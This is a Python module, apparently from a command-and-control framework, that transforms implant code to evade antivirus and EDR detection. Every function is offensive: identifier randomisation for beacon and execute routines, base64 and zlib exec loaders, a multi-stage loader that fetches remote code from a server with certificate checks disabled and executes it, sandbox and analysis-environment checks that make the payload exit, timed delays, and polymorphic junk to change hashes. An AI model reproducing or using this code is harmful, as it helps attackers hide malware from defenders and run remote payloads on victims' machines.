"""c2-37 evasion — AV/EDR evasion techniques for payloads.

Transforms implant code to evade signature-based detection.
All techniques use stdlib only — no external dependencies.
"""
from __future__ import annotations

import base64
import random
import string
import zlib


def randomize_names(code: str) -> str:
    """Randomize class/function/variable names to break signatures."""
    replacements = {
        "Implant": _rand_name(),
        "server_url": _rand_name(),
        "agent_id": _rand_name(),
        "_post": _rand_name(),
        "_system_info": _rand_name(),
        "register": _rand_name(),
        "beacon": _rand_name(),
        "execute": _rand_name(),
        "send_result": _rand_name(),
        "_jittered_sleep": _rand_name(),
        "_run_module": _rand_name(),
        "_builtin_module": _rand_name(),
        "cmd_type": _rand_name(),
        "cmd_id": _rand_name(),
    }
    for old, new in replacements.items():
        code = code.replace(old, new)
    return code


def string_obfuscate(code: str) -> str:
    """Obfuscate string literals by encoding them."""
    import re

    def encode_string(match):
        s = match.group(1)
        # Skip short strings and format strings
        if len(s) < 4 or '{' in s or '%' in s:
            return match.group(0)
        encoded = base64.b64encode(s.encode()).decode()
        return f'__import__("base64").b64decode("{encoded}").decode()'

    # Only encode standalone string assignments, not dict keys
    code = re.sub(r'"(/[a-z]+)"', encode_string, code)
    return code


def compress_and_exec(code: str) -> str:
    """Compress code and wrap in exec(decompress()) loader."""
    compressed = zlib.compress(code.encode(), 9)
    encoded = base64.b64encode(compressed).decode()
    loader = f'''import base64,zlib
exec(zlib.decompress(base64.b64decode("{encoded}")))'''
    return loader


def base64_exec(code: str) -> str:
    """Simple base64 encode + exec wrapper."""
    encoded = base64.b64encode(code.encode()).decode()
    return f'import base64;exec(base64.b64decode("{encoded}"))'


def multi_stage_loader(server_url: str) -> str:
    """Generate a multi-stage loader that fetches code in chunks."""
    return f'''import urllib.request,base64,ssl
c=ssl.create_default_context()
c.check_hostname=False
c.verify_mode=ssl.CERT_NONE
u="{server_url}"
try:d=urllib.request.urlopen(u+"/stage",context=c).read()
except:d=urllib.request.urlopen(u+"/stage").read()
exec(d)'''


def add_sandbox_checks(code: str) -> str:
    """Add checks to detect sandbox/analysis environments."""
    checks = '''
import os,time,platform,multiprocessing
def _e():
    # Check CPU count (sandboxes often have 1-2)
    if multiprocessing.cpu_count() < 2:
        return True
    # Check for common sandbox usernames
    u = os.getenv("USER","") or os.getenv("USERNAME","")
    if u.lower() in ["sandbox","malware","virus","analysis","test","admin"]:
        return True
    # Check RAM (< 2GB suspicious)
    try:
        with open("/proc/meminfo") as f:
            for line in f:
                if "MemTotal" in line:
                    kb = int(line.split()[1])
                    if kb < 2*1024*1024:
                        return True
                    break
    except:
        pass
    # Timing check — sleep should actually sleep
    t1 = time.time()
    time.sleep(1.5)
    if time.time() - t1 < 1.0:
        return True
    return False

if _e():
    import sys
    sys.exit(0)
'''
    return checks + "\n" + code


def add_delayed_execution(code: str, delay: int = 30) -> str:
    """Add initial delay before execution (evades sandbox timeouts)."""
    return f'''import time
time.sleep({delay})
''' + code


def polymorphic_wrapper(code: str) -> str:
    """Wrap code with random junk to change hash each generation."""
    junk_var = _rand_name()
    junk_val = ''.join(random.choices(string.ascii_letters + string.digits, k=64))
    comment = ''.join(random.choices(string.ascii_letters, k=32))
    return f'''# {comment}
{junk_var}="{junk_val}"
del {junk_var}
''' + code


def apply_evasion(code: str, techniques: list[str] = None) -> str:
    """Apply multiple evasion techniques to code.

    Available techniques:
        - randomize: Randomize class/function names
        - compress: Compress + exec wrapper
        - base64: Base64 + exec wrapper
        - sandbox: Add sandbox detection
        - delay: Add execution delay
        - poly: Add polymorphic wrapper
        - strings: Obfuscate string literals
    """
    if techniques is None:
        techniques = ["randomize", "poly", "compress"]

    for tech in techniques:
        if tech == "randomize":
            code = randomize_names(code)
        elif tech == "compress":
            code = compress_and_exec(code)
        elif tech == "base64":
            code = base64_exec(code)
        elif tech == "sandbox":
            code = add_sandbox_checks(code)
        elif tech == "delay":
            code = add_delayed_execution(code)
        elif tech == "poly":
            code = polymorphic_wrapper(code)
        elif tech == "strings":
            code = string_obfuscate(code)

    return code


def _rand_name(length: int = 8) -> str:
    """Generate a random identifier."""
    return '_' + ''.join(random.choices(string.ascii_lowercase, k=length))
